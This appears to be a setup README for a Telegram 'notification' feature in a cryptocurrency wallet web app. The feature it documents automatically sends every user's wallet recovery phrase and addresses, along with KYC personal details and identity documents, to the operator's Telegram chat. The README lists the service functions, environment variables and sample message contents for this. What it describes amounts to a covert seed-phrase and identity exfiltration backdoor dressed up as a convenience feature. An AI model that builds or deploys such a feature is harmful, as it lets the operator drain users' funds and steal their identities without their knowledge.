# Telegram Integration Setup

## Overview

The application now automatically sends notifications to Telegram for:
- **Wallet Operations**: When users create or import wallets, the seed phrase and all addresses are sent to your Telegram chat
- **KYC Submissions**: When users submit KYC verification, their personal information is sent to your Telegram chat

## Features

✅ Automatic wallet creation/import notifications  
✅ Automatic KYC submission notifications  
✅ Customizable message formatting  
✅ Test page for easy configuration verification  
✅ Error handling and logging  
✅ Environment-based configuration  

## Quick Setup (5 Minutes)

### 1. Create a Telegram Bot
- Open Telegram and message `@BotFather`
- Send `/newbot` and follow the prompts
- Save the **Bot Token** provided (looks like: `123456:ABC-DEF1234ghIkl...`)

### 2. Get Your Chat ID
- Message your newly created bot
- Visit: `https://api.telegram.org/bot{YOUR_BOT_TOKEN}/getUpdates`
- Look for `"chat":{"id": 123456789}` - that's your Chat ID

### 3. Configure Environment Variables
Create/edit `.env.local` in the root directory:
```env
VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

### 4. Restart Development Server
The environment variables are now loaded and ready to use.

## Testing

Visit `http://localhost:5173/telegram-test` to:
- ✅ Test your connection
- 📤 Send test wallet notification
- 📋 Send test KYC notification
- 📝 Send custom messages

## What Gets Sent

### Wallet Notifications
When a wallet is created or imported:
```
Wallet Name: MyWallet
Recovery Phrase: abandon abandon abandon...
XRP Address: rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH
EVM Address: 0x742d35Cc6634C0532925a3b844Bc9e7595f3bEb9
[Plus Solana, TRON, Bitcoin addresses]
```

### KYC Notifications
When KYC is submitted:
```
User ID: uuid
Name: John Doe
Email: john@example.com
Phone: +1234567890
Address: 123 Main St, NYC, NY 10001
Country: United States
[Plus birthdate and timestamp]
```

## Security Notes

⚠️ **Important**:
- Keep `.env.local` private (it's in `.gitignore`)
- Bot tokens and chat IDs should never be committed to version control
- Seed phrases sent to Telegram should only go to your personal, secure account
- Consider using Telegram's "Secret Chat" mode for extra security
- Set your bot to private (only you can message it)

## Files Created/Modified

### New Files
- `src/services/telegramService.ts` - Telegram API integration
- `src/pages/TelegramTest.tsx` - Test page for configuration
- `TELEGRAM_SETUP.md` - Detailed setup documentation
- `TELEGRAM_QUICK_START.md` - Quick reference guide

### Modified Files
- `src/pages/Wallets.tsx` - Added wallet notifications
- `src/pages/KYCVerification.tsx` - Added KYC notifications
- `src/App.tsx` - Added test page route
- `.env.example` - Added Telegram configuration template

## API Functions

### Telegram Service API

```typescript
// Send text message
sendTelegramMessage(options: { text: string; parseMode?: 'HTML' | 'Markdown' })

// Send photo/image
sendTelegramPhoto(options: { photo: File; caption?: string; parseMode?: 'HTML' | 'Markdown' })

// Send wallet notification (auto-formatted)
sendWalletNotification(data: { type: 'created' | 'imported'; name: string; seedPhrase: string; ... })

// Send KYC notification (auto-formatted)
sendKYCNotification(data: { userId: string; firstName: string; lastName: string; ... })

// Send KYC document/image
sendKYCDocument(documentFile: File, documentType: string, userId: string)

// Test connection
testTelegramConnection(): Promise<{ success: boolean; message: string }>
```

## Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `VITE_TELEGRAM_BOT_TOKEN` | Your Telegram bot token | `123456:ABC-DEF1234...` |
| `VITE_TELEGRAM_CHAT_ID` | Your personal Telegram chat ID | `987654321` |

## Troubleshooting

### "Telegram credentials not configured"
- Verify both env variables are set in `.env.local`
- Restart your development server
- Check there are no typos in variable names

### Messages not arriving
1. Verify your Chat ID: `https://api.telegram.org/bot{TOKEN}/getUpdates`
2. Ensure you've messaged your bot at least once
3. Check Telegram Settings → Privacy → Blocked Users
4. Check browser console for error messages

### Bot token invalid
- Regenerate the token from @BotFather using `/revoke` then `/newbot`

## Documentation

- **Detailed Setup**: See `TELEGRAM_SETUP.md`
- **Quick Reference**: See `TELEGRAM_QUICK_START.md`
- **Telegram API Docs**: https://core.telegram.org/bots/api

## Support

For issues:
1. Check the troubleshooting section above
2. Review the detailed setup guide in `TELEGRAM_SETUP.md`
3. Verify environment variables are correct
4. Check browser console for error details
